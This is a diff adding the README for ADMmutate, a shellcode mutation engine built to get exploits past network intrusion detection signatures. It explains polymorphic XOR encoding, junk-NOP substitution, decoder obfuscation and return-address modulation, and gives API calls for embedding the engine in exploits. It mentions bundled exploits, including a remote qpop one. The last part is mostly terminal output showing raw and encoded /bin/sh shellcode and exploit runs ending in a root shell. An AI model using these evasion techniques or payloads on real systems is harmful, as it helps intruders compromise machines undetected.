@@ -1,0 +1,379 @@
+                      ___      ______      _       _
+                    /     \   |   _   \   |  \   /  |
+                   |  / \  |  |  |  \  |  |   \_/   |
+                   | |___| |  |  |_ /  |  |   \_/   |
+..oO  THE          |  ---  |  |       /   |  |   |  |         CreW Oo..
+                   '''   '''   '''''''    ''''   ''''
+                               presents
+
+
+                      [ ADMmutate 0.8.4 by K2 ]
+
+              A shellcode mutation engine, can evade NIDS.
+
+GREETZ:  
+   ADM CREW, WE LOVE YOU *!#()*$U@()*$@()&*#!!!!
+   thx plaguez,ksoze,dr,lord julus,innu,w00w00,vacuum,jeru,ActivaTE,Cough,andrewg
+   & a big thx to all old virii coders
+
+DISCLAIMER:
+   This product is meant for educational purposes only.  Any resemblance to real
+   persons, living or dead is purely coincidental.  Void where prohibited.  Some
+   assembly may be required.  Batteries not included.  Contents may settle during
+   shipment.  Use only as directed.  May be too intense for some viewers.  If
+   condition persists, consult your physician.  No user serviceable parts inside.
+   Breaking seal constitutes acceptance of agreement.  Not responsible for direct,
+   indirect, incidental or consequential damages resulting from any defect, error
+   or failure to perform.  Slippery when wet.  For office use only.  Substantial
+   penalty for early withdrawal.  Do not write below this line.  Your canceled
+   check is your receipt.  Avoid contact with skin.  Employees and their families
+   are not eligible.  Beware of dog.  Driver does not carry cash.  Limited time
+   offer, call now to insure prompt delivery.  Use only in well ventilated area.
+   Keep away from fire or flame.  Some equipment shown is optional.  Price does
+   not include taxes, dealer prep, or delivery.  Penalty for private use.  Call
+   toll free before digging.  Some of the trademarks mentioned in this product
+   appear for identification purposes only.  All models over 18 years of age.  Do
+   not use while operating a motor vehicle or heavy equipment.  Postage will be
+   paid by addressee.  Apply only to affected area.  One size fits all.  Many
+   suitcases look alike.  Edited for television.  No solicitors.  Reproduction
+   strictly prohibited.  Restaurant package, not for resale.  Objects in mirror
+   are closer than they appear.  Decision of judges is final.  This supersedes
+   all previous notices.  No other warranty expressed or implied.
+                        
+                                                         -- fortune rocks!!
+DESCRIPTION:
+   There is always more then one way to do it, right?
+
+   A lot of the properties used here were pioneered from virii writers from 
+   long ago.
+
+   Network Intrusion Detection Systems (NIDS) have become more and more
+   prevalent in the network environment these days.  They have lowered the
+   administrative overhead of network security with automated event 
+   logs and in some cases automated attack responses.  These systems
+   typically employ a number of techniques to detect various network
+   attacks.  
+
+   * Signature analysis
+   * Protocol analysis
+   * Traffic pattern statistics
+
+   These methods compliment each other and work together to identify, log
+   and respond to network attacks.
+
+   I have chosen to attack the signature analysis method with a
+   technique very well known to virus enthusiasts, a polymorphic algorithm
+   that is designed to impair the effectiveness of regexp's against known
+   attack signatures. (signatures are typically several bytes that are known
+   to be the same for every execution of the exploit)
+
+   Polymorphism is the ability exist in multiple forms.  This being said,
+   if the application level data is put through a mutation algorithm, you
+   should have an equivalently functional, but completely unique code
+   fragment.
+
+   This technique is quite easy to adapt to the needs of the exploit
+   coder.  Buffer overflow's in the traditional sense usually,
+   have sufficient non operational code that when can be altered to
+   perform a number of other tasks.  If we presume 1KB buffer
+   (BUFSIZ on most systems), this is ample space to perform any operations
+   we see fit.
+
+   Example. 700 bytes of NOP's "N" (0x90), 80 bytes shellcode 
+   "S"(exec /bin/sh), 200 bytes return address "R" (into NOP's someplace), in
+   the form [NNNN][SSSS][RRRR].  What we attempt to do, is to encode the
+   shellcode with a simple mechanism (xor) so that the shellcode will be unique
+   to any NIDS sensor.  This should take care of any shellcode signature
+   analysis, we can also easily tackle the NOP portion of the code by
+   substituting NOP's for other instructions that bear no operational
+   consequence to the remaining code.  Although we must be careful to
+   substitute the NOP code with opcodes that are equivalent length, we would
+   not want to return in the middle of an instruction.  Optionally, a weight
+   can be placed on any of these potential NOP replacements so that substituted
+   code may adhere to some statistical pattern.  
+
+   So what do we have now?  We have encoded shellcode, and substituted NOP's,
+   all we need is to place our decoder into the code.  What we have to be 
+   careful about is to produce code that resists signature analysis.  It
+   would not be cool if the IDS vendor could simply detect our decoder.
+   Some techniques that are used here are multiple code paths, non operational
+   pad instructions, out-of-order decoder generation and randomly generated
+   instructions.
+
+   For instance, if we intend to load a register with some known data (our
+   decode key), we can push DATA, pop REGISTER or we can move DATA,REGISTER
+   or CLEAR REGISTER, add DATA,REGISTER, etc... endless possibilities.
+   Each instruction of the decoder can be substituted by any number equivalent
+   instructions, so long as the algorithm is not changed.
+
+   Another technique is non operational padding, to accomplish this, when
+   generating the decoder we ensure that there are some spare CPU registers
+   that are left available for any operation we see fit.  For example, on IA32
+   EAX was selected, as it is optimized to be used with many
+   instructions, and is occasionally the implicit target of an operation.
+   This allows us to pad every instruction in our decoder with 
+   one of or more JUNKS!!! MUL X EAX, SHR X EAX, TEST EAX,EAX, etc...
+   (X is randomly selected from an array of integers that passed through all
+   shellcode requirements.)
+
+   To further reduce the pattern of the decoder, out-of-order decoders are now
+   supported.  This will allow you to specify where in the decoder certain
+   operational instructions may be located.
+
+   Shellcode restrictions, now that we have shellcode that can be generated in
+   a form that is random in nature, there may be some parameters we would like
+   this shellcode to conform to.
+
+   tolower(), toupper(), certain BANNED char's?  These are all obstacles that
+   have to be dealt with to have functional shellcode.  All of them however
+   are dealt with by using quite a large keyspace (2x16bit) to encode
+   the shellcode.  I have been fortunate to see over 100,000 possible keys
+   even with banned+toupper requirements.
+
+   Currently, the mutated strings are generated from srand seeded with the
+   current time, this rate should be sufficient for most uses  one random string
+   per second.  There is a special case though, with offset brute force code, a
+   need to generate random strings at very quick rate.  To accommodate this some
+   architecture specific code has been added to the engine, most modern CPU's
+   contain a tick/counter register that is updated by the CPU once every one
+   or two cycles.  This allows us to get new values to seed srand with at an
+   extremely high rate.
+
+   How this is normally accomplished, all key's that are banned or are
+   noncompliance are removed from the search, then the shellcode is encoded
+   with every possible key remaining in the keyspace.  All keys that generated
+   compliant shellcode are saved for later random selection.  We do a second
+   round for fun :)
+
+   What about the return addresses?
+   Even though it is only a 4 byte repeating string, we can modulate the least
+   significant byte with hope that it will still be valid when the target 
+   is hit.  Most vulnerabilities require you to modify the offset for various
+   reasons.  You can also optionally truncate the shellcode for increased 
+   packet variance.
+
+   As we encode/decode 32-bit quantities, with an 8-bit accumulator, this
+   translates to 4 x 256, or about 1K of shellcode, this should be
+   reasonable for most uses.  I've rarely seen shellcode > 1K.
+   
+   IDS defense, some have stated that the most prominent place for NIDS to
+   detect polymorphic shellocode is the NOP section.  On IA32 I have approximately
+   55 suitable 1byte standard NOP replacements.  Some will say that in a 1K
+   overflow where approx 700bytes represents a 55/256 selection of possible
+   codes, this could be a means for detection.  However, I do not believe an
+   IDS could do this very effectively, IA32 instructions are variable length
+   (1->16bytes) and it is not a simple matter of doing byte-per-byte analysis
+   of the code they will have to decode the stream (bitwise), and thanks to
+   CISC encodings there are many branch's in this logic, leading to increased
+   processing overhead in the detection process.
+
+   Sliding keys have been implmented on the IA32 archatechture.  This will
+   effectivly eliminate the ability to recover the plaintext shellcode by means
+   of the reversable nature of xor.  This means that every iteration of the
+   decode loop will incrament the key by a random amount (32bit).  This 
+   adds significantly the the strength of the encoded shellcode to resist
+   any analysis, the key is 32bit modulated by a slide of equal size, giving us
+   a maximum of 64bit key&slide combinations.
+
+   Along the way you may learn that, for HPPA, there are independent I and D
+   cache, so a flush will be required for each (for every word modified).  Not
+   that easy though, along with each fic/fdc (flush I/flush D) you will need to
+   sync (code 0x00040000), that totals 4 instructions, and 6 null bytes of
+   bloat to the decoder plus the fact that you have to pad 7 instructions
+   between where you are executing and what code you are modifying.  A context
+   switch will not work either (tried with setreuid).  We do something tricky
+   here, along the way I noticed that my coredumps were accurate (they had the
+   cache flushed before they were written to disk), so it was logical to assume
+   that a fork(); call should copy an operational image and begin to exec in
+   that space. :)  The child lives, the parent dies.
+
+   Let's also analyze the code segments of common applications, weigh the junk
+   instructions to an equivalent percentage of frequency.
+
+   Simple signature analysis unfortunately, cannot provide very high levels 
+   of assurances.
+   
+FILES:
+   ADMmutapi.h is the API glue,
+   ADMmuteng.[ch] is the ADMmutatation API,
+   m7 is a demo of the API, (exploit filter),
+   vulnerable is local vulnerable program,
+   vulnerable-remote is a remote vulnerable program (run from inetd),
+   exp is an exploit that should exploit "vulnerable" cleanly
+   expx is similar to exp, except it demo's the API in a typical exploit
+   qp.c is a demo remote qpop linux sploit.
+   zdec.* are skeleton's for the decoders
+
+USAGE:
+   In m7 I've added -U and -l for toupper/tolower resistant shellcodes,
+   -c has been added to enable the output C ARRAY mode,
+   I also added -u to enable the offset modulation routine,
+   also, -t will truncate the buf by the specified amount some exploits
+   have garbage @ the extreme tail end.
+   it will either read the binary output from -x, or it will read stdin.
+   multiple arch support has been integrated, (INTEL,SPARC) for now.
+   MIPS and HPPA are planned soon.
+   keys have been expanded from 8-bit -> 2 rounds of 16-bit.
+
+   WHAT IT DO?
+   Well, there are four required functions to the API,
+   init_mutate, apply_key, apply_jnops, apply_engine.   
+
+   There is one optional function.
+   apply_offset_mod()
+
+   And there is a control structure that needs to be filled in.
+
+   struct morphctl mut;
+   mut will have several members,
+
+   mut.arch should be set to one of (DISABLE,IA32,SPARC,HPPA,MIPS,IA32_SLIDE),
+   mut.lower would enable tolower() resilient code,
+   mut.upper would enable toupper() resilient code,
+   mut.omodulate will modulate the designated offset,
+   mut.cipher is the cipher to use (it is randomly selected),
+   mut.cipher2 is the second 16-bit key.
+   mut.banned can be loaded with a char string that cannot appear in the
+   final shellcode.  (this only effect's the encoded shellcode, if you want
+   to ban codes that are in the engine itself or the junk nops, your going
+   to have to edit their flag in ADMmuteng.h)
+
+   init_mutate(struct morphctl *)
+   This function should initialize pointers to the OS specific structures, 
+   functions and limits that were specified in mut.arch; DISABLE, IA32, SPARC
+   HPPA or IA32_SLIDE.
+
+   apply_key(buff,E,N,struct morphctl *)
+   This function takes in input buff, substitutes E bytes @ location buff+N
+   with encoded bytes.  It also will find a key that will work with your
+   processing options.  MUST BE CALLED AFTER init_mutate.
+
+   apply_jnops(buff,N,struct morphctl)
+   This function takes buff, substitutes the first N bytes
+   with alternate "junk nops"
+
+   apply_engine(buff,E,N,struct morphctl)
+   This functions takes  buff, generates a decode engine, places it at location
+   buff+N-strlen(of.the.engine).
+
+   apply_offset_mod(buff,N,X,morphctl);
+   This function takes buf, modifies N amount at location buff+X, and adheres
+   to the options in morphctl, such that the return address will be unique on
+   execution.
+
+   Any non 0 return is an error.
+
+   To use in your exploit, simply add (for IA32),
+   ...
+   #include "ADMmutapi.h"
+   struct morphctl *mctlp;
+   struct morphctl mut;
+   mut.upper = 0; mut.lower = 0; mut.banned = 0; mctlp = &mut;
+   mut.arch = IA32;
+   ...
+   init_mutate(mctlp);
+   apply_key(buff, strlen(shellcode), nops-1, mctlp);
+   apply_jnops(buff, nops-1, mut);
+   apply_engine(buff, strlen(shellcode), nops-1, mut);
+   ...
+
+   and you have now a polymorphic shellcode.
+
+EXTEND:  
+   If anybody would like to extend architecture support, just write a decoder
+   for use in ADMmuteng.h, and the appropriate mutate_fixup patch. That's
+   it!!
+
+TODO:
+   add more reverseable polymorphisms (more then just xor)
+   add more arch.
+   new sparc decoder w/o isspace() char's.
+   multibyte dynamic JUNK code. (only 1byte of dynamic instrucions is done now)
+   add more comprehensive error reporting
+   clean things up a bit.. coding style and flexibility :\
+   possibly some anti-debugging/armour code.
+
+CHANGES:
+   added IA32_SLIDE, this will defeat any attempts to recover the original code
+   up to 55 NOP replacements on IA32
+   added weighted queuing
+   ran spell check :)
+   added out-of-order decoder generation
+   removed some DEBUG stuff that was cluttering all to hell
+   added dynamic instructions eg. ADD N,%EAX;
+   added offset modulation
+   added multiple arch support
+   added 2x16-bit key's
+   added output to C type char array.
+   added buffer truncation
+   added DISABLE architecture support!
+   added some of (Sparc:TICK,HP:TIMER,ALPHA:PCC,Pentium:TSC,MIPS:COUNT)
+         register seed's for rand (some sploits run many times/sec)
+
+COMPATIBILITY:
+   Solaris(2.x),IRIX(6.x),HPUX(11),Linux, OpenBSD(2.x),UnixWare(7.x),
+   OpenServer(5.x), TRU64(5.x), NetBSD(1.x), FreeBSD(4.3)
+
+BUGS:
+   IA32:
+      Due to str calculations, -1 from the NOPS when passing it to the mutate
+      functions.  This really depends on how you use NOPS in your sploit
+      though.
+   
+   HPUX:
+      There's some instruction encoding issues right now, keep JMAX @ 2.
+
+EXAMPLE:
+(the -o OFFSET will be DIFFERENT for everything, this is so m7 know where
+to stop encoding)
+
+/* This example m7 just printf(buffer) to stdout */
+
+snow:~/work/mnew/ADMmutate# ./vulnerable `./exp | ./m7 -i -o 0xbffff63e -n 0x90`
+jmp = [0xbffff63e]      offset = [-550]
+args 2
+doing stuffz...
+sh-2.03# exit
+
+/* This next example m7 exec(vulnerable) itself) */
+
+snow:~/work/mnew/ADMmutate# ./m7 -i -o 0xbffff67e -n 0x90 -x ./exp
+jmp = [0xbffff67e]      offset = [-550]
+args 2
+doing stuffz...
+sh-2.03# 
+
+if you would like to see the shellcodes and some other of my debug stuff, -DDEBUG
+as you can see the STR is different every time.
+
+THIS IS NOT SO MAD ALPHA ANY MORE@*$(*$@!()!
+Thx for alpha testing.
+
+snow:~/work/mnew/ADMmutate# ./m7 -i -o 0xbffff6 -n 0x90 -x ./exp
+target offset = 0xbffff6
+target offset = 0x90
+jmp = [0xbffff67e]      offset = [-550]
+LEN=[1204] STR=[ë"^‰ó‰÷ƒÇ1Àª‰ù‰ð«‰ú1À«Í€1Û‰Ø@Í€èÙÿÿÿ/bin/sh~öÿ¿~öÿ¿~öÿ¿~öÿ¿~öÿ¿~öÿ¿~öÿ¿~öÿ¿~öÿ¿~öÿ¿~öÿ¿~öÿ¿~öÿ¿~öÿ¿~öÿ¿~öÿ¿~öÿ¿~öÿ¿~öÿ¿~öÿ¿~öÿ¿~öÿ¿~öÿ¿~öÿ¿~öÿ¿~öÿ¿~öÿ¿~öÿ¿~öÿ¿~öÿ¿~öÿ¿~öÿ¿~öÿ¿~öÿ¿~öÿ¿~öÿ¿~öÿ¿~öÿ¿~öÿ¿~öÿ¿~öÿ¿~öÿ¿~öÿ¿~öÿ¿~öÿ¿~öÿ¿~öÿ¿~öÿ¿~öÿ¿~öÿ¿~öÿ¿~öÿ¿~öÿ¿~öÿ¿~öÿ¿~öÿ¿~öÿ¿~öÿ¿~öÿ¿~öÿ¿~öÿ¿~öÿ¿~öÿ¿~öÿ¿~öÿ¿~öÿ¿~öÿ¿~öÿ¿~öÿ¿~öÿ¿~öÿ¿~öÿ¿~öÿ¿~öÿ¿~öÿ¿~öÿ¿~öÿ¿~öÿ¿~öÿ¿~öÿ¿~öÿ¿~öÿ¿~öÿ¿~öÿ¿~öÿ¿~öÿ¿~öÿ¿~öÿ¿~öÿ¿~öÿ¿~öÿ¿~öÿ¿~öÿ¿~öÿ¿~öÿ¿~öÿ¿~öÿ¿~öÿ¿~öÿ¿~öÿ¿~öÿ¿~öÿ¿~öÿ¿~öÿ¿~öÿ¿~öÿ¿~öÿ¿~öÿ¿~öÿ¿~öÿ¿~öÿ¿~öÿ¿~öÿ¿~öÿ¿~öÿ¿~öÿ¿~öÿ¿~öÿ¿~öÿ¿~öÿ¿~öÿ¿~öÿ¿~öÿ¿~öÿ¿~öÿ¿~öÿ¿~öÿ¿~öÿ¿~öÿ¿~öÿ¿~öÿ¿~öÿ¿~öÿ¿~öÿ¿~öÿ¿~öÿ¿~öÿ¿~öÿ¿~öÿ¿~öÿ¿~öÿ¿~öÿ¿~öÿ¿~öÿ¿~öÿ¿~öÿ¿~öÿ¿~öÿ¿~öÿ¿~öÿ¿~öÿ¿~öÿ¿~öÿ¿~öÿ¿~öÿ¿~öÿ¿~öÿ¿~öÿ¿~öÿ¿~öÿ¿~öÿ¿~öÿ¿¤øÿ¿]
+JUMPZ = 0xbf00f6ff
+WORKING = 0x90000000
+enc = 52, tot = 1206, njlen = 499, retadd = 655
+NKEYS = [2997781504], mut->cipher = [0x4fd1ec72]
+ENGINE = [65] [ë:‹4$ƒì'@ƒÈ)hOÑìr[1ÉŒÀ±…Àƒàþ“1“Œà…ÀƒÆ'÷ÐƒÆƒÆ–@–âçHŒèëèÁÿÿÿ] [65]
+LEN=[1205] STR=[B'@LDEICEKI'KõHEEH@EIIKEMMEõ@''I'E'IHDBùJùDHLKEEõDK@DEJILMEBMBKEDJJõùJH'EDLEMBAMALC'DAADùHCK'HõAõDB@õõHIù'HLDLJõLEHBEKIõLùBBù@H'I@B@LKAKIùMMHLùD@IEAõHHDJAKAJCHCACõMJLKJJLC''MC@IKCõ@'EJJAIAùDHBLCM@AùL'JEAKBB'EJDõEBJ@J@CùDùC@@õLHCBõBõBHJAHùKBDLAEùIEB@DHKC@EõJõMBõMEI@ùJAAADDIEABMBEIKKDJJõJABHIHK@HDõLAMIAKHC@K'BJCCCLCEMùIKB@KCDCLDBEõ'ùBCùKLE'ùAILD'LõDùEHC@DMHCMKKIDALBCùõõEEKEõ'õ'HIEH@K'@CDIõ@''IEHCBLL@H'''L'BCEDùDEJI'JKBùMIBCBID@JACEõë:‹4$ƒì'@ƒÈ)hOÑìr[1ÉŒÀ±…Àƒàþ“1“Œà…ÀƒÆ'÷ÐƒÆƒÆ–@–âçHŒèëèÁÿÿÿ:Î,Æ"e…ÌëC{e‹Æ!Gûµà,ÙÿÙèq‚QÝ©Æ     ¬¿Ï95°.Ã&¿Ã'¯¿~öÿ¿~öÿ¿~öÿ¿~öÿ¿~öÿ¿~öÿ¿~öÿ¿~öÿ¿~öÿ¿~öÿ¿~öÿ¿~öÿ¿~öÿ¿~öÿ¿~öÿ¿~öÿ¿~öÿ¿~öÿ¿~öÿ¿~öÿ¿~öÿ¿~öÿ¿~öÿ¿~öÿ¿~öÿ¿~öÿ¿~öÿ¿~öÿ¿~öÿ¿~öÿ¿~öÿ¿~öÿ¿~öÿ¿~öÿ¿~öÿ¿~öÿ¿~öÿ¿~öÿ¿~öÿ¿~öÿ¿~öÿ¿~öÿ¿~öÿ¿~öÿ¿~öÿ¿~öÿ¿~öÿ¿~öÿ¿~öÿ¿~öÿ¿~öÿ¿~öÿ¿~öÿ¿~öÿ¿~öÿ¿~öÿ¿~öÿ¿~öÿ¿~öÿ¿~öÿ¿~öÿ¿~öÿ¿~öÿ¿~öÿ¿~öÿ¿~öÿ¿~öÿ¿~öÿ¿~öÿ¿~öÿ¿~öÿ¿~öÿ¿~öÿ¿~öÿ¿~öÿ¿~öÿ¿~öÿ¿~öÿ¿~öÿ¿~öÿ¿~öÿ¿~öÿ¿~öÿ¿~öÿ¿~öÿ¿~öÿ¿~öÿ¿~öÿ¿~öÿ¿~öÿ¿~öÿ¿~öÿ¿~öÿ¿~öÿ¿~öÿ¿~öÿ¿~öÿ¿~öÿ¿~öÿ¿~öÿ¿~öÿ¿~öÿ¿~öÿ¿~öÿ¿~öÿ¿~öÿ¿~öÿ¿~öÿ¿~öÿ¿~öÿ¿~öÿ¿~öÿ¿~öÿ¿~öÿ¿~öÿ¿~öÿ¿~öÿ¿~öÿ¿~öÿ¿~öÿ¿~öÿ¿~öÿ¿~öÿ¿~öÿ¿~öÿ¿~öÿ¿~öÿ¿~öÿ¿~öÿ¿~öÿ¿~öÿ¿~öÿ¿~öÿ¿~öÿ¿~öÿ¿~öÿ¿~öÿ¿~öÿ¿~öÿ¿~öÿ¿~öÿ¿~öÿ¿~öÿ¿~öÿ¿~öÿ¿~öÿ¿~öÿ¿~öÿ¿~öÿ¿~öÿ¿~öÿ¿~öÿ¿~öÿ¿~öÿ¿~öÿ¿~öÿ¿~öÿ¿~öÿ¿~öÿ¿~öÿ¿~öÿ¿¤øÿ¿9]
+args 2
+doing stuffz...
+sh-2.03# 
+snow:~/work/mnew/ADMmutate# ./m7 -i -o 0xbffff6 -n 0x90 -x ./exp
+target offset = 0xbffff6
+target offset = 0x90
+jmp = [0xbffff67e]      offset = [-550]
+LEN=[1204] STR=[ë"^‰ó‰÷ƒÇ1Àª‰ù‰ð«‰ú1À«Í€1Û‰Ø@Í€èÙÿÿÿ/bin/sh~öÿ¿~öÿ¿~öÿ¿~öÿ¿~öÿ¿~öÿ¿~öÿ¿~öÿ¿~öÿ¿~öÿ¿~öÿ¿~öÿ¿~öÿ¿~öÿ¿~öÿ¿~öÿ¿~öÿ¿~öÿ¿~öÿ¿~öÿ¿~öÿ¿~öÿ¿~öÿ¿~öÿ¿~öÿ¿~öÿ¿~öÿ¿~öÿ¿~öÿ¿~öÿ¿~öÿ¿~öÿ¿~öÿ¿~öÿ¿~öÿ¿~öÿ¿~öÿ¿~öÿ¿~öÿ¿~öÿ¿~öÿ¿~öÿ¿~öÿ¿~öÿ¿~öÿ¿~öÿ¿~öÿ¿~öÿ¿~öÿ¿~öÿ¿~öÿ¿~öÿ¿~öÿ¿~öÿ¿~öÿ¿~öÿ¿~öÿ¿~öÿ¿~öÿ¿~öÿ¿~öÿ¿~öÿ¿~öÿ¿~öÿ¿~öÿ¿~öÿ¿~öÿ¿~öÿ¿~öÿ¿~öÿ¿~öÿ¿~öÿ¿~öÿ¿~öÿ¿~öÿ¿~öÿ¿~öÿ¿~öÿ¿~öÿ¿~öÿ¿~öÿ¿~öÿ¿~öÿ¿~öÿ¿~öÿ¿~öÿ¿~öÿ¿~öÿ¿~öÿ¿~öÿ¿~öÿ¿~öÿ¿~öÿ¿~öÿ¿~öÿ¿~öÿ¿~öÿ¿~öÿ¿~öÿ¿~öÿ¿~öÿ¿~öÿ¿~öÿ¿~öÿ¿~öÿ¿~öÿ¿~öÿ¿~öÿ¿~öÿ¿~öÿ¿~öÿ¿~öÿ¿~öÿ¿~öÿ¿~öÿ¿~öÿ¿~öÿ¿~öÿ¿~öÿ¿~öÿ¿~öÿ¿~öÿ¿~öÿ¿~öÿ¿~öÿ¿~öÿ¿~öÿ¿~öÿ¿~öÿ¿~öÿ¿~öÿ¿~öÿ¿~öÿ¿~öÿ¿~öÿ¿~öÿ¿~öÿ¿~öÿ¿~öÿ¿~öÿ¿~öÿ¿~öÿ¿~öÿ¿~öÿ¿~öÿ¿~öÿ¿~öÿ¿~öÿ¿~öÿ¿~öÿ¿~öÿ¿~öÿ¿~öÿ¿~öÿ¿~öÿ¿~öÿ¿~öÿ¿~öÿ¿~öÿ¿~öÿ¿~öÿ¿~öÿ¿¤øÿ¿]
+JUMPZ = 0xbf00f6ff
+WORKING = 0x90000000
+enc = 52, tot = 1206, njlen = 499, retadd = 655
+NKEYS = [2997781504], mut->cipher = [0x860e6c02]
+ENGINE = [72] [ëA‹4$ƒìŒÀh†l[ƒèTÁè‘1À‘ƒÈHkÀ›jfY“1“ƒÀu–@–ƒø™–@–°OÁÈÈF@FâåƒÈ”ëèºÿÿÿ] [72]
+LEN=[1205] STR=[CEHKLE'BB@KM@IHMMõJ@HJDICD@KLBJMùCõLEAALCMIM'IEMõMLIA@'JIMHAMIMAEE@BõõHMHLCõHMCCMCDHJMùBùDJHEMD'D@CõH@ABCDHõILICMK@KLLMKJCIKCJCDIELKBHCõùIKKL@CMAKùJDE@B'BADJBBMADCKMBAADC@õ'HK'AIEõõJõABLBKABKJIKEõ@@BJõCEMAKL@MMùJõ@DLI@MJILAMIBC'HHBKù'MJ@õCILCKKJH@'BJKAIBDKD@EC'JMBIAMI''ùMDICC@KIIHõõCHIDõIL'@MHAõJHJKEEHõIH'DùD'H@'õõHABMõ'LELDAH'KA'ùJBEJBAHCù@LKABJLKKKB@IõMKJEùMMCAùDMHHJLBDELK'õ'LD@DMAùIKK'I@'õJALùKJIùAMDCEõKõE@B'C@KHùHõEùLHDëA‹4$ƒìŒÀh†l[ƒèTÁè‘1À‘ƒÈHkÀ›jfY“1“ƒÀu–@–ƒø™–@–°OÁÈÈF@FâåƒÈ”ëèºÿÿÿÌåN\ýåõÉk3F¤åûþÇ‹|?¬©6hKŽ]ÙÖ,ÏæµýyñC`ï`Cqîpšý¿~öÿ¿~öÿ¿~öÿ¿~öÿ¿~öÿ¿~öÿ¿~öÿ¿~öÿ¿~öÿ¿~öÿ¿~öÿ¿~öÿ¿~öÿ¿~öÿ¿~öÿ¿~öÿ¿~öÿ¿~öÿ¿~öÿ¿~öÿ¿~öÿ¿~öÿ¿~öÿ¿~öÿ¿~öÿ¿~öÿ¿~öÿ¿~öÿ¿~öÿ¿~öÿ¿~öÿ¿~öÿ¿~öÿ¿~öÿ¿~öÿ¿~öÿ¿~öÿ¿~öÿ¿~öÿ¿~öÿ¿~öÿ¿~öÿ¿~öÿ¿~öÿ¿~öÿ¿~öÿ¿~öÿ¿~öÿ¿~öÿ¿~öÿ¿~öÿ¿~öÿ¿~öÿ¿~öÿ¿~öÿ¿~öÿ¿~öÿ¿~öÿ¿~öÿ¿~öÿ¿~öÿ¿~öÿ¿~öÿ¿~öÿ¿~öÿ¿~öÿ¿~öÿ¿~öÿ¿~öÿ¿~öÿ¿~öÿ¿~öÿ¿~öÿ¿~öÿ¿~öÿ¿~öÿ¿~öÿ¿~öÿ¿~öÿ¿~öÿ¿~öÿ¿~öÿ¿~öÿ¿~öÿ¿~öÿ¿~öÿ¿~öÿ¿~öÿ¿~öÿ¿~öÿ¿~öÿ¿~öÿ¿~öÿ¿~öÿ¿~öÿ¿~öÿ¿~öÿ¿~öÿ¿~öÿ¿~öÿ¿~öÿ¿~öÿ¿~öÿ¿~öÿ¿~öÿ¿~öÿ¿~öÿ¿~öÿ¿~öÿ¿~öÿ¿~öÿ¿~öÿ¿~öÿ¿~öÿ¿~öÿ¿~öÿ¿~öÿ¿~öÿ¿~öÿ¿~öÿ¿~öÿ¿~öÿ¿~öÿ¿~öÿ¿~öÿ¿~öÿ¿~öÿ¿~öÿ¿~öÿ¿~öÿ¿~öÿ¿~öÿ¿~öÿ¿~öÿ¿~öÿ¿~öÿ¿~öÿ¿~öÿ¿~öÿ¿~öÿ¿~öÿ¿~öÿ¿~öÿ¿~öÿ¿~öÿ¿~öÿ¿~öÿ¿~öÿ¿~öÿ¿~öÿ¿~öÿ¿~öÿ¿~öÿ¿~öÿ¿~öÿ¿~öÿ¿~öÿ¿~öÿ¿~öÿ¿~öÿ¿~öÿ¿¤øÿ¿9]
+args 2
+doing stuffz...
+sh-2.03# 
